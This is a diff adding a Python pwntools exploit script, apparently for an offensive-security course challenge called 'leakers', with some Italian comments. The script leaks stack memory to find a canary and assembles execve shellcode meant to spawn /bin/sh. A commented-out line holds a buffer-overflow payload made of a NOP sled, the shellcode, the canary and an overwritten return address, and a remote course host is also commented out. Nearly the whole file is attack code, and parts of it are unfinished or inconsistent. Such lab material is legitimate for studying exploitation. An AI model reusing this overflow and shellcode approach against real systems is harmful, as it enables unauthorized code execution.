@@ -1,0 +1,100 @@
+#! /usr/bin/python3
+import sys
+import pwn
+import time
+import copy
+
+def memscan():
+    tosend=104*b'A'
+    length=[104]
+    while len(tosend)<200:
+        r.send(tosend+b'A')
+        yeet = r.recvuntil("> ")
+        out = r.recv()
+        input("wait")
+        tosend = out
+        length.append(len(tosend))
+        if length[-1]==length[-2]:
+            break
+    #print(length)
+    out=bytearray(out)
+    for i in length:
+        if i < len(out):
+            #print("i: "+str(i), end=" ")
+            #print(out[i])
+
+            if out[i] == 65:
+                #print("sost")
+                out[i]=0
+    return bytes(out)
+
+
+pwn.context.log_level='DEBUG'
+
+# per runnare il processo in virtual machine e interagirci da fuori:
+# ssh= ssh("username","ip")
+# r= ssh.process("./multistage")                    multistage name of the process
+
+pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
+r = pwn.process("./leakers")
+pwn.gdb.attach(r, '''
+b * 0x004011d7
+b * 0x00401205
+b * 0x00401223
+c
+''' )
+
+shellcode1= '''
+xor rdi,rdi
+mov rdi,0x0
+add rdi,0x5c
+mov rax,0x3b
+xor rsi,rsi
+xor rdx,rdx
+syscall
+'''
+pwn.context.arch="amd64"
+shellcode=pwn.asm(shellcode1)
+#print(len(shellcode))
+#r=pwn.remote("bin.training.offdef.it",2010)
+r.sendafter("Welcome to Leakers!\n\n",b'AAAA\n')
+input("wait")
+scan=memscan()
+j=0
+for i in scan:
+    if j%8==0:
+        print()
+    print(hex(i), end=" ")
+    j+=1
+
+exploit=(100-len(shellcode))
+#r.send(105*b'A')
+#out=r.recvuntil("> ")
+#r.read(105)
+#canary=b'\x00'+r.read(7)
+#r.recv()
+#r.send(b'AAAAA')
+#r.recvuntil("> ")
+#out=r.recv()
+#pwn.log.debug(canary)
+#pwn.log.debug(endbuf1)
+#canary=out[111:121]
+#r.send((105-len(shellcode)-8)*b'\x90'+shellcode+b'/bin/sh\x00'+canary+7*b'\x00'+b'\x66\xdc\xff\xff\xff\x7f\x00\x00')
+#print(len((105-len(shellcode)-8)*b'\x90'+shellcode+b'/bin/sh\x00'))
+#for byte in canary:
+#    print(hex(byte), end=' ')
+input("wait")
+r.send(b'\x00')
+r.interactive()
+
+##r.send(pwn.asm(shellcode2)+b'')
+#a=r.recv()
+#for byte in a:
+#    print(hex(byte), end=' ')
+#r.send()
+#r.send(len(fragment1)*b'\x90'+pwn.asm(shellcode2)+payload)
+#r.interactive()
+
+#sys.stdout.buffer.write(shellcode+(20-len(shellcode))*b'\x41'+payload+pwn.asm(shellcode2))
+#input("wait")
+#sys.stdout.buffer.write(payload+pwn.asm(shellcode2))
